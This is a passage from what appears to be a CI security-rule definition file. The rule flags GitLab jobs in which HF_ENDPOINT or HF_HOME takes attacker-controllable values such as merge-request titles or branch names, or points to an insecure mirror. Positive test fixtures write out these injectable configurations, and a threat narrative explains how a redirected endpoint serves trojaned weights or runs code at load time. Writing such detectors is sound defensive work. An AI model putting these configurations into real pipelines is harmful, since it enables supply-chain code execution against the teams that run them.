        reference=(
            "https://huggingface.co/docs/huggingface_hub/en/package_reference/environment_variables"
        ),
        test_positive=[
            (
                "fetch:\n"
                "  variables:\n"
                "    HF_ENDPOINT: $CI_MERGE_REQUEST_TITLE\n"
                "  script:\n"
                "    - huggingface-cli download org/model\n"
            ),
            (
                "fetch:\n"
                "  variables:\n"
                "    HF_HUB_ENDPOINT: http://insecure-mirror.example/hf\n"
                "  script:\n"
                "    - python -c 'from huggingface_hub import snapshot_download'\n"
            ),
            (
                "fetch:\n"
                "  variables:\n"
                "    HF_HOME: $CI_COMMIT_BRANCH\n"
                "  script:\n"
                "    - python train.py\n"
            ),
        ],
        test_negative=[
            (
                "fetch:\n"
                "  variables:\n"
                "    HF_ENDPOINT: https://huggingface.co\n"
                "  script:\n"
                "    - huggingface-cli download org/model\n"
            ),
            (
                "fetch:\n"
                "  variables:\n"
                "    HF_ENDPOINT: https://internal-mirror.corp/hf\n"
                "  script:\n"
                "    - huggingface-cli download org/model\n"
            ),
            (
                "fetch:\n"
                "  variables:\n"
                "    HF_HOME: /tmp/hf-cache\n"
                "  script:\n"
                "    - python train.py\n"
            ),
        ],
        stride=["T", "S"],
        threat_narrative=(
            "An attacker sets a value that flows into "
            "``HF_ENDPOINT``: a controlled MR title (when the "
            "pipeline assigns it from ``$CI_MERGE_REQUEST_TITLE``), "
            "a controlled branch name, or a controlled pipeline "
            "input.  Every ``from_pretrained`` call in the run "
            "resolves through the attacker's mirror, which returns "
            "trojaned weights or — via ``auto_map`` in "
            "``config.json`` — arbitrary Python code that runs at "
            "load time."
        ),
        incidents=[
            "JFrog x Hugging Face - auto_factory remote-code redirection (2024-2025)",
        ],
    ),
]
